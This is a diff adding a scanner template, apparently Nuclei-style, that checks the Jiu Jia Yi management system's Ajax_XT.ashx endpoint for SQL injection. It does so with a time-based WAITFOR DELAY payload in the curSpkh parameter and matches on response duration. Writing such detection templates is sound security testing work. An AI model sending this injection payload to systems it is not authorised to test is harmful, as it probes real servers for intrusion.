@@ -1,0 +1,46 @@
+id: poc-yaml-jiu-jia-yi-ms-ajax-xt-ashx-sqli
+info:
+  name: 九佳易管理系统 Ajax_XT.ashx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    SQL Injection vulnerability in 九佳易管理系统 (Jiu Jia Yi Management System) in the Ajax_XT.ashx endpoint.
+
+variables:
+  t1: '{{rand_int(5,10)}}'
+  t2: '{{to_number(t1)+2}}'
+
+http:
+  - raw:
+      - |
+        GET /Service/Ajax_XT.ashx HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "未将对象引用设置到对象的实例"
+          - "应用程序中的服务器错误"
+
+  - raw:
+      - |
+        GET /Service/Ajax_XT.ashx?curFlag=PicSord&curPxbh=1%2c2&curSpkh=1'WAITFOR+DELAY+'0:0:{{t1}}'-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "0"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
